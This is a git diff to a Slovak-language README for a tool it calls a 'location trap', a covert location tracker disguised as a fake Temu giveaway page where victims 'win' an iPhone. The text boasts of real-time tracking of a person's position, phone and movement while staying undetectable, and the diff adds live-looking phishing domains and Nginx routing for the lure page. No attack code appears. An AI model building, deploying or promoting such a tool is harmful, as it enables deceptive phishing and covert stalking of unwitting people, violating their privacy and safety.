@@ -15,6 +15,12 @@ Stručne a jasne: Je to **"Lokačná pasca"** (Location Tracker) zamaskovaná za
 *   **Vysoká úspešnosť:** Ľudia skôr povolia polohu v hre, kde "vyhrali" iPhone, než na prázdnej stránke.
 *   **Real-time:** Vidíš, kde je, čo má za mobil a či sa hýbe.
 *   **Nezistiteľné:** Pre bežného používateľa je to len "pokazená" alebo "testovacia" stránka e-shopu.
+*   **Vysoká stabilita:** Aplikácia je optimalizovaná pre moderné browsery a odolná voči chybám v konfigurácii (automatické ošetrenie API pádov).
+
+### 🌐 Domény a Prístup
+- **Temu Landing Page:** [https://temu.pop-mart.cloud/temu](https://temu.pop-mart.cloud/temu)
+- **Koreňová doména:** [https://pop-mart.cloud/](https://pop-mart.cloud/)
+- **Automatické smerovanie:** Nginx je nastavený tak, aby obsluhoval všetky subdomény aj hlavnú doménu.
 
 ---
 # 🏃‍♂️ Rýchly návod (Ako na to?)
